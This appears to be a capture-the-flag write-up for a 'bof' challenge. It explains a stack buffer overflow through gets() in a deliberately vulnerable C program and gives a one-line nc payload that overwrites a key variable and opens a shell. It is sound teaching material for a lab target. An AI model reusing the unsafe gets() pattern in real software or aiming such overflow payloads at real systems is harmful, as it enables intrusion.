## bof
This time, we have a readme on the home, it tells us that "bof" is running on a port on localhost. Taking a look at the source code, we see that this is a classic buffer overflow situation.
## Solution
```c
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);       // smash me!        
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");        }
	else{
		printf("Nah..\n");
	}
}
```
All that this program do is read input and store it on the overflowme[] buffer. Then it checks if the argument passed is 0xcafebabe, if so, it gives us a shell. That's what we want, so, what is the value passed to the function?
```c
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
Oh, the argument value was 0xdeadbeef, so we cannot get a shell, too bad...<br>
Except... func() reads input using **gets()**. The thing about **gets()** is that it doesn't check if the input is out of binds, that means that we can write on memory outside of the buffer! We shouldn't do it randomly though, first we have to find a compelling place to write to. We can use gdb for that purpose.
```bash
gdb ./bof
```
Analizing the assembly, we can find the addresses of both the overflowme buffer and the key.
```
buffer = ebp-0x2c
key = ebp+0x8
```
The difference between them is 52 bytes, which means that, if we write 52 bytes to the input, we can start to rewrite the value in key, giving it the value of 0xcafebabe. Since we know that the binary is running under "nc 0 9000", we can pass the exact bytes we want with
```bash
(printf "a%.0s" {1..52} && printf "\xbe\xba\xfe\xca"; cat) | nc 0 9000
```
We get a shell, now all we need to do is cat the flag. Success! 
